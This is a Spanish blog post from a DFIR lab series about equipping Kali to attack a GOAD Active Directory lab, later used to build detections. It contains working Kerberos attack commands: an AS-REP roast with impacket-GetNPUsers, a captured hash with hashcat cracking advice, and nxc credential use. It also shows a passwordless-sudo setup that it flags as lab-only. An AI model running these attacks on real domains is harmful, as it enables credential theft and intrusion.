---
layout: post
title: "AD DFIR Lab — Part 7: The Night King Rises — Kali como plataforma de ataque"
date: 2026-04-13 13:00:00 +0100
category: cases
lang: es
ref: case-ad-dfir-lab-part7
tags: [dfir, kali, impacket, bloodhound, certipy, lab]
description: "Preparamos Kali para atacar el dominio: qué trae kali-linux-default, qué falta, problemas con apt sources del CD-ROM, herramientas críticas para GOAD (kerbrute, mitm6, certipy-ad, nxc), y verificación end-to-end con un AS-REP roast real."
comments: true
---

*Esta es la Part 7 de la serie [AD DFIR Lab]({% post_url es/2026-04-12-ad-dfir-lab-intro %}). Dejamos Kali lista para los ataques de Phase 9.*

## kali-linux-default trae casi todo, pero no todo

Cuando instalamos Kali en Part 2 con `kali-linux-default`, quedaron instaladas las herramientas ofensivas habituales: toda la suite de Impacket, BloodHound, evil-winrm, Responder, Hashcat, John, Nmap... Pero al verificar para GOAD faltaban algunas que son críticas para los ataques que planeamos ejecutar.

Primera comprobación rápida:

```bash
for tool in impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump \
            impacket-psexec impacket-wmiexec certipy-ad bloodhound-python \
            evil-winrm nxc responder mitm6 kerbrute hashcat john \
            enum4linux-ng kinit; do
    which $tool &>/dev/null && echo "  OK  $tool" || echo "  MISS $tool"
done
```

Resultado:

```
  OK  impacket-GetNPUsers
  OK  impacket-GetUserSPNs
  OK  impacket-secretsdump
  OK  impacket-psexec
  OK  impacket-wmiexec
  OK  certipy-ad
  OK  bloodhound-python
  OK  evil-winrm
  OK  nxc
  OK  responder
  MISS  mitm6
  MISS  kerbrute
  OK  hashcat
  OK  john
  MISS  enum4linux-ng
  MISS  kinit
```

4 herramientas importantes faltaban:
- **mitm6** — para ataques IPv6 DNS takeover
- **kerbrute** — enumeración de usuarios AD via Kerberos pre-auth
- **enum4linux-ng** — enum SMB/LDAP moderno
- **kinit** (del paquete `krb5-user`) — para manejar tickets Kerberos manualmente

## Cambios de nombre importantes

Dos herramientas clásicas han cambiado de nombre y siguen apareciendo en tutoriales desactualizados:

**`crackmapexec` → `nxc`**
```bash
# Lo que sale en tutoriales viejos:
crackmapexec smb 192.168.10.10 -u brandon.stark -p Password

# Lo que funciona hoy:
nxc smb 192.168.10.10 -u brandon.stark -p Password
```

`crackmapexec` se abandonó en 2023 y el proyecto se renombró a **NetExec (nxc)**. Kali ya no trae el binario viejo, trae `nxc`.

**`certipy` → `certipy-ad`**
El ejecutable original se llamaba `certipy`, ahora se llama `certipy-ad`. Mismo proyecto, pero los scripts antiguos rompen.

## El problema del CD-ROM en apt sources

Primera sorpresa al intentar `sudo apt-get install mitm6`:

```
E: The repository 'cdrom://[Kali GNU/Linux 2026.1rc3 ...] kali-rolling Release'
   does not have a Release file.
E: Unable to locate package mitm6
```

Kali mantiene la ISO del instalador como **primera fuente en `/etc/apt/sources.list`**. Después del install, apt sigue intentando leer paquetes de un CD que ya no existe, y los repos HTTP no están configurados.

Fix:

```bash
# Comentar la línea del cdrom
sudo sed -i "s|^deb cdrom|# deb cdrom|" /etc/apt/sources.list

# Añadir el repo HTTP oficial
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" \
    | sudo tee -a /etc/apt/sources.list

sudo apt-get update
```

Ahora sí:

```bash
sudo apt-get install -y mitm6 krb5-user enum4linux-ng
```

## kerbrute: no está en los repos

`kerbrute` es una herramienta escrita en Go de **ropnop** (Ronnie Flathers) para enumerar usuarios de AD via Kerberos pre-auth. No está en los repos de Kali — se distribuye como binario en GitHub releases:

```bash
sudo wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 \
    -O /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
```

## NOPASSWD sudo para automatización (solo en lab)

Cuando queremos ejecutar comandos en Kali desde el host Proxmox vía SSH, cada `sudo` pide password interactivamente y rompe la automatización:

```
sudo: a terminal is required to read the password
```

En un lab (nunca en producción) podemos saltarnos esto:

```bash
echo "kali ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/kali-nopasswd
sudo chmod 440 /etc/sudoers.d/kali-nopasswd
```

Ahora los scripts de ataque se pueden lanzar desde el hypervisor sin interacción.

## Verificación end-to-end: AS-REP roast de brandon.stark

En lugar de solo verificar que las herramientas se instalaron, lanzamos un **ataque real** que toca todas las capas del lab: NAT de pfSense, DNS del dominio, Kerberos del DC, impacket en Kali. Si todo esto funciona, las herramientas valen y el networking del lab es correcto.

**brandon.stark** es vulnerable a AS-REP Roasting (atributo `DoesNotRequirePreAuth=True` configurado por GOAD). Podemos solicitar un ticket AS-REP **sin credenciales** que contiene material cifrado con su hash NTLM:

```bash
# Desde Kali (192.168.20.100 en VLAN 20)
printf "brandon.stark\nsansa.stark\njon.snow\nrobb.stark\n" > /tmp/users.txt

impacket-GetNPUsers \
    -no-pass \
    -dc-ip 192.168.10.11 \
    -usersfile /tmp/users.txt \
    north.sevenkingdoms.local/
```

Resultado:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:7c710c0d1bd2fe364beb69005e64178b$3ab66bbc1cca021c05dca3a01d09d19ad021dd9c794ff2c63e3f58b2bc32196324c59a858764680e8c74d1a90df4f6a114891664eeb757153322e3382abd43ca5f6b996c080b529c42f30c6ec10b6a688cd3cf9963f4911fb99d035857b1f1a1178bb507a3254f87d2f7a9fa86cae5e0f93a56f37d91080c3c865f0a9aa89fac0ca277cd4c72b3063b097efe86335f315dc9b5e222a157c4f882239a0bdcb1b5f676b16ab38c64fa8ec9ea081c06671c78b608700d3d047650d6963d3fb3c370cfe3064df2eee59941d0e2ae012b1b486005ed1384baff12da1ce961f48ea407c9ff15743276a80c9849fa11c55e5ed095bb324bde6c6347fc025247e8fcb86b3a352204da16

[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Este hash es crackeable con hashcat (`-m 18200`) contra un diccionario para recuperar el password plaintext de brandon.stark. Pero lo importante ahora mismo es **lo que acabamos de validar**:

| Capa | Verificado |
|------|-----------|
| **Kali → pfSense NAT** | El tráfico de 192.168.20.100 salió por 192.168.10.2 ✅ |
| **pfSense → DC02** | Ruteo entre VLANs funciona ✅ |
| **DNS** | Kali resolvió `north.sevenkingdoms.local` via DC01 ✅ |
| **Kerberos** | DC02 procesó la petición AS-REQ ✅ |
| **Impacket** | Decodificó el AS-REP y extrajo el hash ✅ |
| **GOAD vuln** | brandon.stark tiene `DoesNotRequirePreAuth=True` ✅ |

Un solo comando valida seis capas del stack. Esta es **la prueba definitiva de que el lab está listo para atacar**.

## Snapshot `clean-ad`

Antes de generar ruido histórico o ejecutar ataques, tomamos un snapshot **`clean-ad`**:

```bash
for VMID in 100 101 102 103 104 105 106 107 108; do
    qm snapshot $VMID clean-ad \
        --description "Fresh AD, Sysmon+auditd active, Kali tools ready, zero noise"
done
```

Este snapshot representa el estado del lab con:
- ✅ Dominios + trust + vulnerabilidades GOAD
- ✅ Sysmon + audit policy + auditd
- ✅ Kali armada con todas las herramientas
- ❌ Cero tráfico histórico (los logs solo tienen eventos del propio deploy)

Es el baseline para **estudiar TTPs en aislamiento** — cuando lances un Kerberoast aquí, los eventos que veas en el Security.evtx son **únicamente** del Kerberoast. Sin interferencias.

### Gotcha: el snapshot tiene que ser previo a cualquier test

Mi primera versión de `clean-ad` estaba **contaminada**. ¿Por qué? Porque lo hice **después** del AS-REP roast de verificación. Ese ataque de test dejó un Event 4768 en el Security.evtx de DC02 con `brandon.stark` y tipo de cifrado `0x17` (RC4) — exactamente la firma de un AS-REP roast en los logs. En un snapshot supuestamente "limpio" eso es un problema: cualquier detección que construyas contra clean-ad detectaría un "ataque" que no era tal.

Comprobación post-hoc:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4768} |
    Where-Object { $_.Message -match "brandon.stark" } |
    Select TimeCreated, Id
# TimeCreated             Id
# -----------             --
# 4/13/2026 8:39:44 AM  4768   ← el test!
```

Solución: revertir las VMs Windows al snapshot anterior (`audit-configured`), dejar Kali intocada (su estado con tools instaladas es correcto), y retomar `clean-ad` con Windows limpios + Kali armado. ZFS snapshots por VM son independientes, así que podemos revertir solo algunas VMs y snapshottar diferentes estados en el mismo "punto lógico".

**Regla**: cualquier acción que toque el dominio deja rastros en EVTX. Haz tus tests **antes** del snapshot target, no después.

El siguiente paso será generar el snapshot contrario: un AD con **un año de actividad corporativa simulada** encima, donde los mismos ataques se esconden entre miles de eventos legítimos. Los dos snapshots servirán para casos de uso diferentes:

- **`clean-ad`** → aprender cómo se ve cada TTP, desarrollar detecciones, demos didácticas
- **`noisy-ad-1year`** → threat hunting realista, timeline analysis, entrenar analistas

---

*Siguiente: Part 8 — A Day in the Realm: Generating Baseline Noise (próximamente)*

*Anterior: [Part 6 — Ravens and Whispers: Audit Configuration]({% post_url es/2026-04-13-ad-dfir-lab-part6-audit %})*
